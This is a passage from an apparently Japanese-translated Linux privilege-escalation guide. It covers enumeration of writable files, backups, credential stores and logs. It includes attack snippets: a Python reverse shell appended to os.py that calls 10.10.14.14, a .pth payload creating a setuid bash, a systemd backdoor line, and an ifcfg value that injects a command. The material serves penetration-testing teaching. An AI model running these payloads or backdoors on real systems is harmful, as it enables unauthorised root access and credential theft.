注: BSD プラットフォームでは、`/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、`/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**機密ファイルに書き込めるか**確認してください。たとえば、**サービス設定ファイル**に書き込めますか？

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

たとえば、マシンで**tomcat**サーバーが稼働していて、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる**場合、次の行を変更できます。

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

次回 tomcat が起動したときに、backdoor が実行されます。

### フォルダを確認する

以下のフォルダには、バックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（最後のフォルダはおそらく読み取れませんが、試してみてください）

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### 不審な場所／所有者のファイル

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### 直近数分間に変更されたファイル

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DBファイル

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

読み取り可能なアプリケーションデータベースでは、テーブル名とカラム名を確認し、ユーザー名やパスワードハッシュを探します。ハッシュを見つけること、そのパスワードを復元すること、それがローカルアカウントでも再利用されていると証明することは、それぞれ別の手順です。一般的な32文字の16進数文字列だけでは、MD5やアカウントへのアクセス権があるとは判断できません。

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

読み取り可能なシェル履歴に `sudo` コマンドの後にパスワードのような短い行がある場合は、前後の行を手動で確認してください。通常の `sudo` プロンプトに入力したパスワードはシェル履歴に保存されません。後続の行は、誤ってシェルに入力された可能性があるだけで、有効なパスワードの証拠ではありません。`.sudo_as_admin_successful` マーカーが記録するのは過去の使用であり、現在の認証状態ではありません。

### 隠しファイル

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH 内のスクリプト/バイナリ**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Webファイル**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **バックアップ**

バックアップディレクトリ内の読み取り可能なファイルだけでなく、**名前**に `backup` を含むファイルも調べます。不透明な名前や暗号化拡張子のアーカイブでも、古いアプリケーションデータが含まれている可能性があります。暗号化アーカイブは、あくまで露出候補です。パスワードの復旧、内容の調査、アプリケーションのハッシュの取得、そのパスワードをUnixアカウントで再利用することは、それぞれ別の確認手順です。アーカイブ内にハッシュがあっても、ローカルログインが可能だとは限りません。

読み取り可能な仮想マシンのバックアップも同様に調査します。VirtualBoxの `.vbox` 設定ファイルには、接続された `.vdi` イメージを特定する情報や、暗号化されたディスクキーのメタデータが含まれることがあります。[VirtualBoxのドキュメントによると、暗号化されたデータキーはVMの設定ファイルに保存されます](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html)。オフラインでディスクを調査するには、設定ファイルとイメージの両方にアクセスできる必要があります。ゲストのボリュームには独自の[LUKS暗号化レイヤー](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc)がある場合があり、その場合は別のキーが必要です。正規の手順で復号できた後でも、古いスクリプトや設定にパスワードが含まれている可能性があります。その認証情報がホストアカウントで現在も有効であることと、実効的な `sudo` ポリシーで特権コマンドを実行できることを確認してから、ローカル権限昇格と判断してください。受動的な列挙中は、イメージをコピー、復号、マウントせずにパスと権限を調べます。

読み取り可能なアーカイブを調査する際は、何かを展開する前にメンバー名を一覧表示します。実際のファイルが保護されていても、隠れた認証ファイル、リカバリーコードの情報、SSHキーが含まれている可能性があります。ファイル名は手掛かりにすぎません。内容とアカウントでの再利用の有無は、それぞれ別途確認してください。

バックアップディレクトリ内にある**他のユーザーが所有する読み取り可能なアーカイブ**、特にroot所有のものや、グループメンバーシップを通じてアクセス可能なものを優先して調べます。ライブコピーが保護されていても、古いアーカイブに設定や認証シークレットが含まれている可能性があります。[Backrest](https://garethgeorge.github.io/backrest/)のようなローカルバックアップUIでは、サービスの実効アカウントと、低権限ユーザーがその設定を読み取れるか、またはUIに認証できるかを確認します。その[hooks](https://garethgeorge.github.io/backrest/docs/hooks)と[resticコマンドインターフェース](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto)は、デーモンのファイル権限とコマンド実行権限で動作する可能性があります。ループバックリスナーであることだけでは、影響は判断できません。Backrestの `passwordBcrypt` は、[認証コード](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go)内のbase64エンコードされたbcryptハッシュであり、平文のパスワードではありません。露出したアーカイブやUIを権限境界として扱う前に、サービスの実行ユーザー、有効な認証情報、該当するプランまたはリポジトリへのアクセスを確認してください。

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### パスワードを含む可能性がある既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを確認してください。**パスワードを含む可能性のある複数のファイル**を検索します。\
同様の目的に使える**もう1つの興味深いツール**は[**LaZagne**](https://github.com/AlessandroZ/LaZagne)です。Windows、Linux、Mac のローカルコンピューターに保存された多数のパスワードを取得するオープンソースアプリケーションです。

`/etc/guacamole/guacamole.properties`を読み取れる場合は、`mysql-*`、`postgresql-*`、または`sqlserver-*`のデータベース接続設定を確認してください。Guacamole JDBC テーブルの読み取りが許可されたアカウントでは、`guacamole_connection_parameter`に、保存済みの SSH `username`、`password`、`private-key`、または`passphrase`の値が含まれていることがあります。まず接続 ID とパラメーター名を確認し、関連する行だけを調べてください。保存された値は、再利用可能なシークレットではなく、動的トークンや vault への参照である場合があります。[Guacamole JDBC スキーマ](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html)と[SSH 接続パラメーター](https://guacamole.apache.org/doc/gug/configuring-guacamole.html)を参照してください。

[pswm パスワードマネージャー](https://github.com/Julynx/pswm#usage)は、既定で暗号化された vault を`~/.local/share/pswm/pswm`に保存します。他のユーザーの vault が見える場合は、その所有者と、自分のアカウントで実際に読み取れるかどうかを確認してください。vault のパスが分かるだけでは、認証情報は判明しません。マスターパスワードの復元、再利用可能なアカウントパスワードの発見、そのアカウントの権限の確認は、それぞれ別の手順です。

[Passpie の既定のデータベース](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database)は`~/.passpie/`で、`.keys`キーチェーンと、グループディレクトリ内の暗号化された`.pass`認証情報ファイルで構成されます。データベースディレクトリが見えても、それは手がかりに過ぎません。キーと対象の暗号化エントリーにアクセスできること、マスターパスフレーズが必要かどうか、復元した認証情報がより高い権限を持つアカウントのものかどうかを確認してください。Passpie は[カスタムデータベースパス](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases)にも対応しているため、既定のパスだけでは網羅できません。自動列挙では、認証情報をエクスポートしたりキーの内容を表示したりせず、メタデータのみを一覧表示してください。

### ログ

ログを読み取れる場合、**ログ内から興味深い情報や機密情報を見つけられる**ことがあります。ログが奇妙であるほど、興味深い可能性が高まります。\
また、設定に問題がある（バックドアが仕込まれた？）**監査ログ**によって、この記事で説明されているように、**パスワードを監査ログに記録できる**場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

ログを読むには、[**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) グループに所属していると非常に役立ちます。

### シェルファイル

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### 汎用的な認証情報の検索/正規表現

ファイル名または内容に「**password**」という単語が含まれるファイルを探し、ログ内のIPアドレスやメールアドレス、ハッシュの正規表現も確認してください。\
これらすべての方法をここに列挙するつもりはありませんが、興味があれば[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

Pythonスクリプトが**どこで**実行されるか分かっていて、そのフォルダーに**書き込める**、またはPythonライブラリを**変更できる**場合は、OSライブラリを変更してbackdoorを仕込めます（Pythonスクリプトの実行場所に書き込める場合は、os.pyライブラリをコピーして貼り付けてください）。

**ライブラリにbackdoorを仕込む**には、os.pyライブラリの末尾に次の行を追加してください（IPとPORTを変更してください）。

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `site.addsitedir()` で処理される書き込み可能な `.pth`

`site.addsitedir(DIR)` を `sys.path.append(DIR)` と同じものとして扱わないでください。`DIR` 内のすべての `*.pth` ファイルも処理します。`import` の後にスペースまたはタブが続く行は、Pythonコードとして実行されます。一方、パス行は site ディレクトリを基準に解決され、存在する場合にのみ追加されます。<sup>[[38]](#references)</sup>

sudoで実行が許可された、またはその他の特権を持つ Python プログラムが、現在のユーザーまたはそのグループが書き込み可能なディレクトリに対して `site.addsitedir()` を呼び出すと、これが privilege escalation につながります。`.pth` のコードは、特権プログラムがインポートパスを設定する際に、通常の処理が実行される前に実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

実行可能な`.pth`の内容は1行に収める必要がありますが、セミコロンを使えば複数の文を記述できます。たとえば、root権限で実行されるコードでsetuid付きのBashコピーを作成し、`-p`を付けてBashを起動すると、実効IDが維持されます。<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

`-S` オプションは Python の自動的な `site` 初期化を無効にするだけです。プログラムが明示的に `site` をインポートして `site.addsitedir()` を呼び出す場合は保護されません。特権付きのインポートパスから攻撃者が書き込み可能なディレクトリを取り除き、ディレクトリとその `.pth` ファイルの所有者が特権管理者であり、書き込み権限もその管理者のみにあることを必須にしてください。<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate の悪用

特権付きの `logrotate` ジョブは、ローテーション中に低い権限のユーザーが置き換えたりリダイレクトしたりできるディレクトリ内のログを実際にローテーションする場合、ユーザー間のファイル書き込み経路を作る可能性があります。ログが書き込み可能であることだけでは、調査の手がかりにすぎません。有効なルールと、その `create`、`olddir`、`su` ディレクティブ、スケジューラーの実効ユーザー、ログの親ディレクトリに対する書き込み権限と検索権限、さらにインストール済みビルドとポリシーで保存先の変更が許可されているかを確認してください。後で特権シェルが起動ファイルへの書き込みをコマンド実行につなげるには、生成されたファイルを読み込む必要もあります。ローテーションを実行したり、競合状態を試したりせずに、スケジュール、ルール、バージョンとパッケージ、パスのメタデータを調べてください。

> [!TIP]
> `3.18.0` やバージョン文字列だけを、悪用可能性の判断基準にしないでください。[Upstream の変更履歴](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md)には、複数のリリースにおけるディレクトリとシンボリックリンクの強化が記録されており、ディストリビューションが修正をバックポートしている場合もあります。[Upstream のマニュアル](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in)では、root が非特権ユーザーの管理下にあるディレクトリ内のログをローテーションする場合、`su` を使用するよう推奨しています。有効なルールと実際の動作を確認してください。

この脆弱性についての詳細は、こちらのページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。<sup>[[37]](#references)</sup>

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) で悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx のログ)** と非常によく似ています。そのため、ログを変更できることが分かったら、誰がそのログを管理しているかを確認し、ログをシンボリックリンクに置き換えて権限昇格できないか調べてください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性の参照:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)。<sup>[[20]](#references)</sup>

低い権限のユーザーが `ifcfg-*` ファイルを作成または変更でき、かつ特権付きのネットワーク有効化処理がそのファイルを読み込む場合、そのファイルは調査対象となります。有効なファイルとディレクトリの権限、選択されたインターフェース、インストール済みの `ifup`/`ifdown` の実装、そしてそれらを実行するユーザーを確認してください。ファイルが書き込み可能であるだけでは、コードは実行されません。[Red Hat の RHEL 7 ネットワークガイド](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files)では、従来のネットワークスクリプトと NetworkManager が区別されており、NetworkManager 自体は前者を起動しません。[RHEL 8 のドキュメント](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking)によると、デフォルトの `ifup`/`ifdown` は NetworkManager を使用し、オプションの従来型パッケージがシェルスクリプトを提供します。

特権付きの従来型スクリプトを実際に使用しているシステムでは、`NAME=` のような、引用符で囲まれていないシェル読み込み形式の `ifcfg-*` 代入によって、コード実行境界を越えられる可能性があります。正確なパーサー、値、有効化経路を確認してください。ファイル名や NetworkManager の存在だけから、シェルとして解釈されると判断してはいけません。呼び出し元の入力を `ifcfg-*` ファイルに書き込み、その後で従来型の `ifup` を呼び出すことを許可された sudo ラッパーは、呼び出し元がファイルを直接編集できない場合でも、この境界に至る別の経路です。

例: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

（Network と /bin/id の間の空白に注意）

### **init、init.d、systemd、rc.d**

`/etc/init.d` ディレクトリには、System V init（SysVinit）、つまり**従来の Linux サービス管理システム**用の**スクリプト**があります。これらのスクリプトには、サービスを `start`、`stop`、`restart` し、ときには `reload` する処理が含まれます。スクリプトは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンクを介して実行できます。Redhat システムでは、代わりに `/etc/rc.d/init.d` が使われます。

一方、`/etc/init` は、Ubuntu が導入した新しい**サービス管理システム**である **Upstart** に関連しています。サービス管理タスクには設定ファイルを使用します。Upstart への移行後も、Upstart の互換レイヤーにより、SysVinit スクリプトは Upstart の設定と併用されています。

**systemd** は、オンデマンドでのデーモン起動、自動マウント管理、システム状態のスナップショットなどの高度な機能を備えた、最新の初期化・サービス管理システムです。ファイルは、ディストリビューションのパッケージ用の `/usr/lib/systemd/` と、管理者による変更用の `/etc/systemd/system/` に整理されており、システム管理を効率化します。<sup>[[21]](#references)</sup>

## その他のテクニック

### NFS 権限昇格


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 制限付き Shell からの脱出


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting framework: manager-channel の悪用

Android rooting framework は一般に、syscall をフックして、特権的なカーネル機能をユーザー空間の manager に公開します。manager の認証が弱い場合（例：FD の順序に基づく署名チェックや、脆弱なパスワード方式）、ローカルアプリが manager になりすまし、すでに root 化されたデバイスで root 権限に昇格できる可能性があります。詳しい解説と exploit の詳細はこちら:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## regex ベースの exec による VMware Tools service discovery LPE（CWE-426）（CVE-2025-41244）

VMware Tools/Aria Operations の正規表現駆動の service discovery は、プロセスのコマンドラインからバイナリパスを抽出し、特権コンテキストで `-v` を付けて実行することがあります。許容的なパターン（例：`\S` の使用）では、書き込み可能な場所（例：`/tmp/httpd`）に攻撃者が配置した listener に一致する場合があり、root としての実行につながる可能性があります（CWE-426 Untrusted Search Path）。<sup>[[27]](#references)</sup>

詳しい解説と、他の discovery/monitoring stack にも応用できる一般化されたパターンはこちら:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## カーネルのセキュリティ保護

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix 権限昇格ツール

### **Linux のローカル権限昇格ベクトルを探す最良のツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t オプション)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC のカーネル脆弱性を列挙 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理アクセス):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**その他のスクリプト集**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning（Crontab UI の権限昇格、zip -P の認証情報再利用）](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron で実行される monitor 用の偽造 .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass（sudo env_keep PATH の乗っ取り）](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [基本的な Linux 権限昇格](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux 権限昇格ガイド](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [攻撃と防御: 2016 年の Linux 権限昇格テクニック](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [誰も command execution を予期していなかった！](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo（LD_PRELOAD）（Linux 権限昇格）](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – ラボ演習の解説 - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux 権限昇格のヒントとテクニック](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux の列挙と権限昇格ツール](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket とは？](https://www.linux.com/news/what-socket/)
- [15] [Peppo（Proving Grounds）の writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS を使う](https://www.linuxjournal.com/article/7744)
- [17] [SUID 実行ファイルによる Linux 権限昇格](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux 権限昇格](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux で ACL を管理する方法](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [network-scripts による Redhat/CentOS の root 権限取得](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd とは？](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka（ログ経由の bash 算術式インジェクション、全体の攻撃チェーン）](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV（非対話型の起動ファイル）](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment（sudo env_keep BASH_ENV → root）](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous（sudo terraform dev_overrides + TF_VAR symlink による権限昇格）](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik（pg_basebackup の cron コピー → SUID bash）](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – 名前を付ければ、VMware がそれを昇格させる（CVE-2025-41244）](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot による権限昇格](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 と CVE-2025-32463 Sudo 権限昇格の脆弱性](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC リポジトリディレクトリ](https://peps.python.org/pep-3147/)
- [32] [Python importlib ドキュメント](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec による Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux でのパスワードのログ記録](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - logrotate の race condition の詳細](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 ドキュメント – `site` とパス設定ファイル](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
